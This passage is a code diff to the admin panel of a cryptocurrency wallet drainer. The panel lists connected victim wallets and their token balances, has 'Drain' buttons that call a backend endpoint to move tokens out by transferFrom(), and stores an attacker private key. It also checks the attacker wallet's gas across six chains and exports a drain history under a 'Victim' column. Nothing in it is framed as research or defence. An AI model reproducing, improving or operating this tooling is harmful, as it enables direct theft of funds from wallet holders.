+    <div class="detail-row"><span class="detail-label">Connected</span><span class="detail-value">${new Date(w.connectedAt).toLocaleString()}</span></div>
+    <div class="detail-row"><span class="detail-label">Last Seen</span><span class="detail-value">${timeAgo(w.lastSeen||w.connectedAt)}</span></div>
+    <div class="detail-row"><span class="detail-label">Status</span><span class="detail-value"><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></span></div>
+    <div class="detail-row"><span class="detail-label">Agent</span><span class="detail-value" style="font-size:10px;color:var(--muted)">${w.userAgent||'\u2014'}</span></div>
+    <div style="margin-top:18px"><div style="font-size:10px;color:var(--muted);font-weight:800;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">Tokens</div>
+    ${toks.length?toks.map(t=>`<div style="background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:13px 16px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center"><div><span style="font-weight:700;color:var(--cyan)">${t.symbol}</span><span style="color:var(--muted);font-size:11px;margin-left:8px">${t.chain||''}</span></div><div style="text-align:right"><div style="font-family:'JetBrains Mono',monospace;font-weight:600">${parseFloat(t.balance).toFixed(4)}</div><div style="font-size:10px;color:var(--muted)">~$${((UP[t.symbol]||1)*parseFloat(t.balance)).toFixed(2)}</div></div></div>`).join(''):'<div style="color:var(--muted2);font-size:12px">No tokens</div>'}
+    </div>
+    ${drains.length?`<div style="margin-top:18px"><div style="font-size:10px;color:var(--muted);font-weight:800;text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">Drains (${drains.length})</div>${drains.map(d=>`<div style="background:${d.success?'var(--greenbg)':'var(--redbg)'};border:1px solid ${d.success?'var(--greenbr)':'var(--redbr)'};border-radius:12px;padding:13px 16px;margin-bottom:6px"><div style="display:flex;justify-content:space-between;margin-bottom:4px"><span style="font-weight:700;color:${d.success?'var(--green)':'var(--red)'}">${d.success?'Success':'Failed'}</span><span style="font-size:11px;color:var(--muted)">${timeAgo(d.startedAt)}</span></div>${d.amount?`<div style="font-family:'JetBrains Mono',monospace;font-size:12px">${d.amount} ${d.symbol}</div>`:''}${d.txHash?`<a href="${(TX_EXP[d.chainId]||'')+d.txHash}" target="_blank" style="color:var(--gold);font-size:10px;font-family:'JetBrains Mono',monospace">${d.txHash.slice(0,20)}...</a>`:''}${d.error?`<div style="font-size:11px;color:var(--red);margin-top:6px;word-break:break-word;line-height:1.5;background:rgba(255,82,82,.04);border-radius:8px;padding:8px 10px"><strong>Error:</strong> ${d.error}</div>`:''}</div>`).join('')}</div>`:''}
+    <div style="display:flex;gap:8px;margin-top:20px;flex-wrap:wrap">
+      <button class="btn sm ghost" onclick="copyText('${w.address}');closeModal()">Copy</button>
+      <a href="${exp}" target="_blank" class="btn ghost sm">Explorer \u2197</a>
+      ${!w.drained&&toks.length?toks.map(t=>`<button class="btn sm red" onclick="closeModal();triggerManualDrain('${w.address}','${t.address}',${t.chainId})">Drain ${t.symbol}</button>`).join(''):''}
+    </div>`
+  document.getElementById('wallet-modal').classList.add('open')
+}
+function closeModal(){document.getElementById('wallet-modal').classList.remove('open')}
+document.getElementById('wallet-modal').addEventListener('click',e=>{if(e.target.id==='wallet-modal')closeModal()})
 
-  function renderLogs() {
-    const logs = dashData.logs || []
-    document.getElementById('log-count').textContent = logs.length + ' entries'
-    document.getElementById('log-box').innerHTML = logs.length === 0
-      ? '<div style="color:var(--muted2)">No logs yet...</div>'
-      : logs.map(l =>
-          `<div class="log-entry">
-            <span class="log-ts">${l.time.replace('T',' ').split('.')[0]}</span>
-            <span class="log-level-${l.level}">[${l.level.toUpperCase()}]</span>
-            <span class="log-msg"> ${l.msg}</span>
-          </div>`).join('')
-  }
-
-  async function loadGas() {
-    const addr = dashData.attackerAddress
-    document.getElementById('gas-attacker-addr').textContent = addr || 'Not configured'
-    if (!addr) return
-
-    const chains = [
-      {id:1,  name:'Ethereum', coin:'ETH', min:0.005},
-      {id:56, name:'BNB Chain',coin:'BNB', min:0.001},
-      {id:137,name:'Polygon',  coin:'MATIC',min:0.5},
-      {id:42161,name:'Arbitrum',coin:'ETH',min:0.002},
-      {id:10, name:'Optimism', coin:'ETH', min:0.002},
-      {id:8453,name:'Base',    coin:'ETH', min:0.001},
-    ]
-
-    const rpcs = {
-      1:'https://eth.drpc.org',56:'https://bsc.publicnode.com',
-      137:'https://polygon.publicnode.com',42161:'https://arbitrum-one.publicnode.com',
-      10:'https://optimism.publicnode.com',8453:'https://base.publicnode.com'
-    }
-
-    const grid = document.getElementById('gas-grid')
-    grid.innerHTML = chains.map(c => `<div class="gas-card" id="gas-${c.id}">
-      <div class="chain-name">${CHAIN_ICONS[c.id]} ${c.name}</div>
-      <div class="balance empty" id="gbal-${c.id}">Loading...</div>
-      <div style="font-size:10px;color:var(--muted)" id="gstatus-${c.id}">checking...</div>
-      <div class="status-bar"><div class="status-bar-fill" id="gbar-${c.id}" style="width:0%;background:var(--muted)"></div></div>
-    </div>`).join('')
-
-    chains.forEach(async c => {
-      try {
-        const rpc = rpcs[c.id]
-        const r = await fetch(rpc,{method:'POST',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_getBalance',params:[addr,'latest']}),signal:AbortSignal.timeout(6000)
-        }).then(r=>r.json())
-        const bal = parseInt(r.result||'0',16)/1e18
-        const el  = document.getElementById('gbal-'+c.id)
-        const bar = document.getElementById('gbar-'+c.id)
-        const st  = document.getElementById('gstatus-'+c.id)
-        el.textContent = bal.toFixed(4) + ' ' + c.coin
-        const pct = Math.min(100, (bal/c.min)*30)
-        if (bal >= c.min) {
-          el.className = 'balance funded'
-          bar.style.width = Math.max(30,pct)+'%'
-          bar.style.background = 'var(--green)'
-          st.textContent = 'Funded \u2014 ready to drain'
-          st.style.color = 'var(--green)'
-        } else if (bal > 0) {
-          el.className = 'balance low'
-          bar.style.width = pct+'%'
-          bar.style.background = 'var(--yellow)'
-          st.textContent = 'Low \u2014 may fail on busy chains'
-          st.style.color = 'var(--yellow)'
-        } else {
-          el.className = 'balance empty'
-          bar.style.width = '0%'
-          st.textContent = 'No gas \u2014 drains will fail'
-          st.style.color = 'var(--red)'
-        }
-      } catch(e) {
-        const el = document.getElementById('gbal-'+c.id)
-        if(el) { el.textContent = 'RPC error'; el.className='balance empty' }
-      }
-    })
-  }
-
-  function showPage(name, el) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'))
-    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'))
-    document.getElementById('page-'+name).classList.add('active')
-    if (el) el.classList.add('active')
-    if (name === 'gas') loadGas()
-    if (name === 'logs') refresh()
-  }
-
-  function showWalletDetail(address) {
-    const w = allWallets.find(x=>x.address===address)
-    if (!w) return
-    const toks = (w.tokens||[]).filter(t => parseFloat(t.balance||0) > 0)
-    let estVal = 0
-    toks.forEach(t => estVal += (USD_PRICES[t.symbol]||1)*parseFloat(t.balance||0))
-    const exp = (ADDR_EXPLORERS[w.chainId]||'https://bscscan.com/address/') + w.address
-    const drains = (dashData.drainHistory||[]).filter(x=>x.owner===address)
-
-    document.getElementById('modal-content').innerHTML = `
-      <div class="detail-row"><span class="detail-label">Address</span><span class="detail-value">${w.address} <a href="${exp}" target="_blank" style="color:var(--gold);font-size:10px">\u2197 Explorer</a></span></div>
-      <div class="detail-row"><span class="detail-label">Network</span><span class="detail-value">${CHAIN_ICONS[w.chainId]||''} ${CHAIN_NAMES[w.chainId]||w.chainId}</span></div>
-      <div class="detail-row"><span class="detail-label">Est. Value</span><span class="detail-value" style="color:${estVal>0?'var(--green)':'var(--muted)'}">$${estVal.toFixed(2)}</span></div>
-      <div class="detail-row"><span class="detail-label">Connected</span><span class="detail-value">${new Date(w.connectedAt).toLocaleString()}</span></div>
-      <div class="detail-row"><span class="detail-label">Last Seen</span><span class="detail-value">${timeAgo(w.lastSeen||w.connectedAt)}</span></div>
-      <div class="detail-row"><span class="detail-label">Status</span><span class="detail-value"><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></span></div>
-      <div class="detail-row"><span class="detail-label">User Agent</span><span class="detail-value" style="font-size:10px;color:var(--muted)">${w.userAgent||'\u2014'}</span></div>
-      <div style="margin-top:18px">
-        <div style="font-size:11px;color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px">Tokens Found</div>
-        ${toks.length ? toks.map(t=>`
-          <div style="background:var(--bg);border:1px solid var(--border2);border-radius:10px;padding:12px 16px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;transition:border-color .15s" onmouseover="this.style.borderColor='var(--cyanbr)'" onmouseout="this.style.borderColor='var(--border2)'">
-            <div>
-              <span style="font-weight:700;color:var(--cyan)">${t.symbol}</span>
-              <span style="color:var(--muted);font-size:11px;margin-left:8px">${t.chain}</span>
-            </div>
-            <div style="text-align:right">
-              <div style="font-family:'JetBrains Mono',monospace;font-weight:600">${parseFloat(t.balance).toFixed(4)}</div>
-              <div style="font-size:10px;color:var(--muted)">~$${((USD_PRICES[t.symbol]||1)*parseFloat(t.balance)).toFixed(2)}</div>
-            </div>
-          </div>`).join('') : '<div style="color:var(--muted2);font-size:12px">No tokens detected</div>'}
-      </div>
-      ${drains.length ? `
-        <div style="margin-top:18px">
-          <div style="font-size:11px;color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px">Drain History (${drains.length})</div>
-          ${drains.map(d=>`
-            <div style="background:${d.success?'var(--greenbg)':'var(--redbg)'};border:1px solid ${d.success?'var(--greenbr)':'var(--redbr)'};border-radius:10px;padding:12px 16px;margin-bottom:6px">
-              <div style="display:flex;justify-content:space-between;margin-bottom:4px">
-                <span style="font-weight:700;color:${d.success?'var(--green)':'var(--red)'}">${d.success?'Success':'Failed'}</span>
-                <span style="font-size:11px;color:var(--muted)">${timeAgo(d.startedAt)}</span>
-              </div>
-              ${d.amount ? `<div style="font-family:'JetBrains Mono',monospace;font-size:12px">${d.amount} ${d.symbol}</div>` : ''}
-              ${d.txHash ? `<a href="${(EXPLORERS[d.chainId]||'https://bscscan.com/tx/')+d.txHash}" target="_blank" style="color:var(--gold);font-size:10px;font-family:'JetBrains Mono',monospace">${d.txHash.slice(0,20)}...</a>` : ''}
-              ${d.error ? `<div style="font-size:11px;color:var(--red);margin-top:6px;word-break:break-word;line-height:1.5;background:rgba(255,82,82,.05);border-radius:6px;padding:6px 10px"><span style="font-weight:700">Error:</span> ${d.error}</div>` : ''}
-            </div>`).join('')}
-        </div>` : ''}
-      <div style="display:flex;gap:8px;margin-top:20px;flex-wrap:wrap">
-        <button class="btn sm ghost" onclick="copyText('${w.address}');closeModal()">Copy Address</button>
-        <a href="${exp}" target="_blank" class="btn ghost sm">Explorer \u2197</a>
-        ${!w.drained && toks.length ? toks.map(t=>`<button class="btn sm red" onclick="closeModal();triggerManualDrain('${w.address}','${t.address}',${t.chainId})">Drain ${t.symbol}</button>`).join('') : ''}
-      </div>`
-
-    document.getElementById('wallet-modal').classList.add('open')
-  }
-
-  function closeModal() { document.getElementById('wallet-modal').classList.remove('open') }
-  document.getElementById('wallet-modal').addEventListener('click', e => { if(e.target.id==='wallet-modal') closeModal() })
-
-  async function triggerManualDrain(ownerAddress, tokenAddress, chainId) {
-    if (!tokenAddress) {
-      const w = allWallets.find(x => x.address === ownerAddress)
-      const tok = (w?.tokens||[])[0]
-      if (tok) {
-        tokenAddress = tok.address
-        chainId = tok.chainId
-      } else {
-        tokenAddress = window.prompt('No tokens detected for this wallet.\n\nEnter token contract address to drain:')
-        if (!tokenAddress || !tokenAddress.startsWith('0x')) { toast('Cancelled \u2014 invalid token address'); return }
-        const chainInput = window.prompt('Enter chain ID (56=BSC, 1=ETH, 137=Polygon, 42161=Arbitrum):','56')
-        chainId = parseInt(chainInput) || 56
-      }
-    }
-    const w = allWallets.find(x => x.address === ownerAddress)
-    const tok = (w?.tokens||[]).find(t => t.address === tokenAddress) || {}
-    const confirm = window.confirm(`Manually drain ${tok.symbol || tokenAddress.slice(0,12)+'...'} from\n${ownerAddress.slice(0,20)}...?\n\nChain ID: ${chainId}\n\nThis will call transferFrom() on-chain immediately.`)
-    if (!confirm) return
-    toast('Drain initiated...')
-    try {
-      const r = await apiFetch('/admin/drain-manual', {
-        method: 'POST',
-        body: JSON.stringify({ owner: ownerAddress, tokenAddress, chainId })
-      })
-      if (r.success) {
-        toast(`Drained ${r.amount} ${r.symbol}`)
-        refresh()
-      } else {
-        toast((r.error||'Drain failed'))
-      }
-    } catch(e) {
-      toast('Error: ' + e.message)
-    }
-  }
-
-  function previewWallet() {
-    const pk = document.getElementById('cfg-pk').value.trim()
-    if (!pk) return
-    const el = document.getElementById('cfg-addr-preview')
-    el.style.display = 'block'
-    document.getElementById('cfg-addr-text').textContent = 'Submit to server to validate...'
-    apiFetch('/admin/config', {method:'POST', body: JSON.stringify({attackerPrivateKey: pk})})
-      .then(r => {
-        if (r.ok) {
-          refresh().then(() => {
-            document.getElementById('cfg-addr-text').textContent = dashData.attackerAddress || 'Saved'
-          })
-          const msg = document.getElementById('cfg-msg')
-          msg.style.display='block'; msg.style.color='var(--green)'; msg.textContent='Wallet saved'
-        } else {
-          document.getElementById('cfg-addr-text').textContent = 'Invalid key: ' + (r.error||'unknown')
-          document.getElementById('cfg-addr-text').style.color = 'var(--red)'
-        }
-      })
-  }
-
-  async function saveConfig() {
-    const pk = document.getElementById('cfg-pk').value.trim()
-    if (!pk) return
-    const r = await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({attackerPrivateKey:pk})})
-    const msg = document.getElementById('cfg-msg')
-    msg.style.display='block'
-    if (r.ok) { msg.style.color='var(--green)'; msg.textContent='Saved'; document.getElementById('cfg-pk').value=''; refresh() }
-    else { msg.style.color='var(--red)'; msg.textContent=r.error }
-  }
-
-  async function savePassword() {
-    const pw = document.getElementById('cfg-pw-new').value
-    if (!pw) return
-    const r = await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({adminPassword:pw})})
-    const msg = document.getElementById('pw-msg')
-    msg.style.display='block'
-    if (r.ok) { adminPw=pw; msg.style.color='var(--green)'; msg.textContent='Password updated'; document.getElementById('cfg-pw-new').value='' }
-    else { msg.style.color='var(--red)'; msg.textContent='Failed' }
-  }
-
-  async function testConnection() {
-    const el = document.getElementById('test-result')
-    el.style.display='block'; el.innerHTML='<span style="color:var(--muted)">Running diagnostics...</span>'
-    const d = await apiFetch('/admin/dashboard')
-    let html = ''
-    html += `<div style="color:var(--green)">Backend online</div>`
-    html += `<div style="${d.attackerAddress?'color:var(--green)':'color:var(--red)'}">
-      ${d.attackerAddress?'Attacker wallet: '+d.attackerAddress:'No attacker wallet configured'}</div>`
-    html += `<div style="color:var(--cyan)">Connected wallets: ${(d.connectedWallets||[]).length}</div>`
-    html += `<div style="color:var(--cyan)">Drain history: ${(d.drainHistory||[]).length} attempts</div>`
-    el.innerHTML = html
-  }
-
-  async function clearWallets() {
-    if (!confirm('Clear all wallet data and drain history?')) return
-    await apiFetch('/admin/wallets',{method:'DELETE'})
-    await refresh()
-    toast('All wallets cleared')
-  }
-
-  async function clearLogs() {
-    await apiFetch('/admin/logs',{method:'DELETE'})
-    await refresh()
-    toast('Logs cleared')
-  }
-
-  function exportWallets() {
-    const rows = [['Address','Chain','Tokens','Est Value','Connected','Status']]
-    allWallets.forEach(w => {
-      let val = 0
-      const toks = (w.tokens||[]).map(t=>{ val+=(USD_PRICES[t.symbol]||1)*parseFloat(t.balance||0); return t.symbol+':'+t.balance }).join(';')
-      rows.push([w.address, CHAIN_NAMES[w.chainId]||w.chainId, toks, '$'+val.toFixed(2), w.connectedAt, w.drained?'Drained':'Active'])
-    })
-    downloadCSV(rows,'wallets.csv')
-  }
-
-  function exportDrains() {
-    const rows = [['Victim','Token','Amount','Chain','Status','TxHash','Time']]
-    ;(dashData.drainHistory||[]).forEach(x => {
-      rows.push([x.owner, x.symbol||'', x.amount||'', CHAIN_NAMES[x.chainId]||x.chainId, x.success?'Success':'Failed', x.txHash||'', x.startedAt])
-    })
-    downloadCSV(rows,'drains.csv')
-  }
-
-  function downloadCSV(rows, filename) {
-    const csv = rows.map(r=>r.map(v=>'"'+String(v).replace(/"/g,'""')+'"').join(',')).join('\n')
-    const a = document.createElement('a')
-    a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv)
-    a.download = filename; a.click()
-  }
-
-  function copyText(txt) {
-    navigator.clipboard.writeText(txt).catch(()=>{})
-    toast('Copied: ' + txt.slice(0,20)+'...')
-  }
-
-  function toast(msg) {
-    const el = document.getElementById('toast')
-    el.textContent = msg; el.classList.add('show')
-    setTimeout(()=>el.classList.remove('show'), 2500)
-  }
-
-  function shortAddr(a) { return a ? a.slice(0,6)+'...'+a.slice(-4) : '\u2014' }
-  function shortHash(h) { return h ? h.slice(0,8)+'...'+h.slice(-6) : '\u2014' }
-  function timeAgo(iso) {
-    if (!iso) return '\u2014'
-    const s = Math.floor((Date.now()-new Date(iso))/1000)
-    if (s < 5)    return 'just now'
-    if (s < 60)   return s+'s ago'
-    if (s < 3600) return Math.floor(s/60)+'m ago'
-    if (s < 86400)return Math.floor(s/3600)+'h ago'
-    return Math.floor(s/86400)+'d ago'
-  }
+async function triggerManualDrain(ownerAddress,tokenAddress,chainId){
+  if(!tokenAddress){const w=allWallets.find(x=>x.address===ownerAddress);const tok=(w?.tokens||[])[0];if(tok){tokenAddress=tok.address;chainId=tok.chainId}else{tokenAddress=window.prompt('No tokens. Enter token address:');if(!tokenAddress||!tokenAddress.startsWith('0x')){toast('Cancelled');return}chainId=parseInt(window.prompt('Chain ID (56=BSC,1=ETH,137=Polygon):','56'))||56}}
+  const w=allWallets.find(x=>x.address===ownerAddress),tok=(w?.tokens||[]).find(t=>t.address===tokenAddress)||{}
+  if(!confirm(`Drain ${tok.symbol||tokenAddress.slice(0,12)+'...'} from ${ownerAddress.slice(0,20)}...?\nChain: ${chainId}`))return
+  toast('Draining...'); try{const r=await apiFetch('/admin/drain-manual',{method:'POST',body:JSON.stringify({owner:ownerAddress,tokenAddress,chainId})});if(r.success){toast('Drained '+r.amount+' '+r.symbol);refresh()}else{toast(r.error||'Failed')}}catch(e){toast('Error: '+e.message)}
+}
+function previewWallet(){const pk=document.getElementById('cfg-pk').value.trim();if(!pk)return;document.getElementById('cfg-addr-preview').style.display='block';document.getElementById('cfg-addr-text').textContent='Validating...';apiFetch('/admin/config',{method:'POST',body:JSON.stringify({attackerPrivateKey:pk})}).then(r=>{if(r.ok){refresh().then(()=>{document.getElementById('cfg-addr-text').textContent=dashData.attackerAddress||'Saved'});const m=document.getElementById('cfg-msg');m.style.display='block';m.style.color='var(--green)';m.textContent='Saved'}else{document.getElementById('cfg-addr-text').textContent='Invalid: '+(r.error||'');document.getElementById('cfg-addr-text').style.color='var(--red)'}})}
+async function saveConfig(){const pk=document.getElementById('cfg-pk').value.trim();if(!pk)return;const r=await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({attackerPrivateKey:pk})});const m=document.getElementById('cfg-msg');m.style.display='block';if(r.ok){m.style.color='var(--green)';m.textContent='Saved';document.getElementById('cfg-pk').value='';refresh()}else{m.style.color='var(--red)';m.textContent=r.error}}
+async function savePassword(){const pw=document.getElementById('cfg-pw-new').value;if(!pw)return;const r=await apiFetch('/admin/config',{method:'POST',body:JSON.stringify({adminPassword:pw})});const m=document.getElementById('pw-msg');m.style.display='block';if(r.ok){adminPw=pw;m.style.color='var(--green)';m.textContent='Updated';document.getElementById('cfg-pw-new').value=''}else{m.style.color='var(--red)';m.textContent='Failed'}}
+async function testConnection(){const el=document.getElementById('test-result');el.style.display='block';el.innerHTML='<span style="color:var(--muted)">Running...</span>';const d=await apiFetch('/admin/dashboard');el.innerHTML=`<div style="color:var(--green)">Backend online</div><div style="${d.attackerAddress?'color:var(--green)':'color:var(--red)'}">${d.attackerAddress?'Wallet: '+d.attackerAddress:'No wallet configured'}</div><div style="color:var(--cyan)">Wallets: ${(d.connectedWallets||[]).length}</div><div style="color:var(--cyan)">Drains: ${(d.drainHistory||[]).length}</div>`}
+async function clearWallets(){if(!confirm('Clear all data?'))return;await apiFetch('/admin/wallets',{method:'DELETE'});await refresh();toast('Cleared')}
+async function clearLogs(){await apiFetch('/admin/logs',{method:'DELETE'});await refresh();toast('Logs cleared')}
+function exportWallets(){const rows=[['Address','Chain','Tokens','Value','Connected','Status']];allWallets.forEach(w=>{let v=0;const t=(w.tokens||[]).map(t=>{v+=(UP[t.symbol]||1)*parseFloat(t.balance||0);return t.symbol+':'+t.balance}).join(';');rows.push([w.address,CN[w.chainId]||w.chainId,t,'$'+v.toFixed(2),w.connectedAt,w.drained?'Drained':'Active'])});downloadCSV(rows,'wallets.csv')}
+function exportDrains(){const rows=[['Victim','Token','Amount','Chain','Status','Tx','Time']];(dashData.drainHistory||[]).forEach(x=>{rows.push([x.owner,x.symbol||'',x.amount||'',CN[x.chainId]||x.chainId,x.success?'Success':'Failed',x.txHash||'',x.startedAt])});downloadCSV(rows,'drains.csv')}
+function downloadCSV(rows,f){const csv=rows.map(r=>r.map(v=>'"'+String(v).replace(/"/g,'""')+'"').join(',')).join('\n');const a=document.createElement('a');a.href='data:text/csv;charset=utf-8,'+encodeURIComponent(csv);a.download=f;a.click()}
+function copyText(t){navigator.clipboard.writeText(t).catch(()=>{});toast('Copied: '+t.slice(0,20)+'...')}
+function toast(m){const el=document.getElementById('toast');el.textContent=m;el.classList.add('show');setTimeout(()=>el.classList.remove('show'),2500)}
+function shortAddr(a){return a?a.slice(0,6)+'...'+a.slice(-4):'\u2014'}
+function shortHash(h){return h?h.slice(0,8)+'...'+h.slice(-6):'\u2014'}
+function timeAgo(iso){if(!iso)return'\u2014';const s=Math.floor((Date.now()-new Date(iso))/1000);if(s<5)return'now';if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'m';if(s<86400)return Math.floor(s/3600)+'h';return Math.floor(s/86400)+'d'}
 </script>
 </body>
 </html>
